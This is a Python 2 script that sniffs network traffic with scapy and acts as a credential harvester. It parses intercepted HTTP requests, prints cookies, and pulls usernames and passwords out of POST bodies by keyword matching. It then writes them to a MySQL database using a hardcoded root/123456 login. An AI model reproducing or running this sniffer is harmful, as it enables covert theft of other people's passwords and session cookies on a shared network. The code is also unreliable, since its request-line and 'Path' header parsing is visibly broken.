#! /usr/bin/env python
#coding:utf-8
from scapy.all import *
import scapy_http.http
from scapy.modules.p0f import prnp0f, p0f
import re
import MySQLdb
load_module('p0f')
# p=sniff(iface="eth0",count=3,store=0)
# print p[0].show()

username_list = ['user','username','ddddd','barcode','id']
 
passwd_list = ['passwd','password','pwd','upass']
def monitor_callback(pkt):
    print '----------------------------------'
#     print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")

#     prnp0f(pkt)
#     print pkt[0]

    
#     hexdump(pkt)
#     p0f(pkt)#要判断参数是否为icp包

#     print pkt.show()

    if IP in pkt:
        if hasattr(pkt[IP],'sport'):
            print pkt[IP].src+':'+str(pkt[IP].sport)+'----->'+pkt[IP].dst+':'+str(pkt[IP].dport)
            if Ether in pkt:
                print pkt[Ether].src+'----->'+pkt[Ether].dst
#                 if Raw in pkt:
#                     if hasattr(pkt[Raw],'load'):
#                         print hexdump(pkt[Raw].load)
        if TCP in pkt:
            http_packet_callback(pkt)
#     if Padding in pkt:
#         print pkt[Padding].load
    print '---------------------------------'
    
def http_packet_callback(packet):
    global username_list
    global passwd_list
    """
                packet anaylser
    """
    #http 
    if packet[TCP].payload:
    #HTTP data
        http_packet = str(packet[TCP].payload)
                 
    #GET/POST HTTP Request
        http_method = http_packet.split('\r\n')[0]
 
        if http_method =='GET':
            header=dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", http_packet[len('GET\r\n'):]))
        elif http_method == 'POST':
            header=dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", http_packet[len('POST\r\n'):]))
        else:
            return
 
    #Print http_packet info
        print "[+]IP:%s"%packet[IP].src
        print "[+]Method:%s"%http_method
        print "[+]Host:%s"%header['Host']
        print "[+]Path:%s"%header['Path']
 
    #Some packets donnot have Cookie
        if 'Cookie' in header.keys():
            print "[+]Cookie:%s"%header['Cookie']
        else:
            header['Cookie'] = ''
 
    #POST method may contains username and passwd
    #header['Data'] is the Sensitive Data of users
        username=''
        passwd=''
        if http_method == 'POST':
            print "[+]POST_Data:%s"%http_packet.split('\r\n')[-1]
            header['Data'] = http_packet.split('\r\n')[-1]
 
            param = dict(re.findall(r"(?P<name>.*?)=(?P<value>.*?)&",header['Data']+'&'))
            print param
 
            for key in param:
                if key.lower() in username_list:
                    username = param[key]
                elif key.lower() in passwd_list:
                    passwd = param[key]
            print "[+]username may be:%s"%username
            print "[+]passwd may be:%s"%passwd
    #In most cases GET method does not contains username and passwd                
        elif http_method == 'GET':
            header['Data'] = ''
                         
        if header['Cookie']!='':
    #save data into database
            save_data(str(packet[IP].src),header['Cookie'],header['Data'],header['Host'],header['Path'],username,passwd,http_method)
 
        print ""    
def save_data(ip,cookie,data,host,path,username,passwd,http_method):

    try:
        conn = MySQLdb.connect(host="localhost",user="root",passwd="123456",db="datap",port=3306)
        cur = conn.cursor()
        sql = 'replace into http(ip,cookie,data,host,path,username,passwd,method) values (%s,%s,%s,%s,%s,%s,%s,%s)'
        n = cur.execute(sql,(ip,cookie,data,host,path,username,passwd,http_method))
        if n != 1:
            raise MySQLdb.Error(-1,'My insert error')
#close pointer object
        cur.close()
        conn.commit()
#close connect object
        conn.close()
    except MySQLdb.Error,e:
        print "[-]MySQLdb Error %d: %s"%(e.args[0],e.args[1])
if __name__ == '__main__':                
    sniff(prn=monitor_callback,filter='ip', store=0)









